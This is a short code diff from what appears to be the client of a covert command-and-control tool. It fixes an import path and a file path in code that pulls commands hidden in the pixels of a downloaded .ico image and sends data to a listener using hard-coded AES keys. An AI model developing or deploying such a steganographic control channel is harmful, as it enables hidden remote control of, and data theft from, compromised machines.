@@ -14,7 +14,7 @@ import zlib
 import random
 import string
 from Crypto.Cipher import AES
-from utils import LISTENER_IP, LISTENER_PORT, STEGO_HEADER_NAME, USER_AGENT, CLIENT_MAX_MESSAGE_LENGTH, AES_KEY, AES_IV, RequestFlags
+from ..utils import LISTENER_IP, LISTENER_PORT, STEGO_HEADER_NAME, USER_AGENT, CLIENT_MAX_MESSAGE_LENGTH, AES_KEY, AES_IV, RequestFlags
 from PIL import Image
 
 # Time in seconds to wait for a http response before a timeout occurs.
@@ -151,11 +151,11 @@ def send_stego_data_to_listener(data: str):
 
 def get_command_line_input(response: Response):
     # TODO: request image from server
-    secret = "/secret_web/secret2.ico"
+    secret = "secret2.ico"
     #data = response.read()
     with open(secret, "wb") as f:
         f.write(response.content)
-    #     # Open the ICO file and extract the first frame
+    # Open the ICO file and extract the first frame
     img = Image.open(secret)
     img = img.convert("RGB")  # Convert to RGB to ensure consistency
     pixels = list(img.getdata())
